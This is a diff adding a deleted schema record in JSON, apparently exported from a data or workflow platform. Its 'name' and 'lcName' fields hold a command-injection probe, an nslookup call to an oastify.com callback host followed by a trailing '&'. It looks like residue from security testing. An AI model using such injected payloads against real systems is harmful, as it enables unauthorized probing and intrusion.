@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334420177,
+	"deleted":true,
+	"description":"SZHLUr",
+	"id":"67caa7948780f31288254f85",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"nslookup -q=cname irdpuwwpss7ik0hj3hwje4002r8kwlken2fp5du.oastify.com.&",
+	"modifiedTime":1741358660280,
+	"name":"nslookup -q=cname irdpuwwpss7ik0hj3hwje4002r8kwlken2fp5du.oastify.com.&",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
